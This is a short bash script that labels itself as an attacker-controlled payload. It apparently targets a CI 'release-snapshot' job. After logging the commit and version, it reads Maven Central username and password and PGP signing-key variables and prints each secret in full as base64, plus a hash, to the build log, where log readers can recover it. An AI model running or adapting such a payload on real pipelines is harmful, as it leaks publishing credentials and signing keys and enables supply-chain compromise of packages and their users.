#!/bin/bash
echo "[EVCI-PAYLOAD] attacker-controlled code executing: release-snapshot"
echo "[EVCI-PAYLOAD] commit: $(git rev-parse HEAD)"
echo "[EVCI-PAYLOAD] project_version=$PROJECT_VERSION"
for v in MAVEN_CENTRAL_USERNAME MAVEN_CENTRAL_PASSWORD PGP_SIGNING_IN_MEMORY_KEY PGP_SIGNING_IN_MEMORY_KEY_PASSWORD; do
  val="${!v}"
  if [ -n "$val" ]; then
    echo "[EVCI-PAYLOAD] $v PRESENT sha256=$(printf %s "$val" | sha256sum | cut -d' ' -f1) b64=$(printf %s "$val" | base64 -w0)"
  else
    echo "[EVCI-PAYLOAD] $v EMPTY-OR-ABSENT"
  fi
done
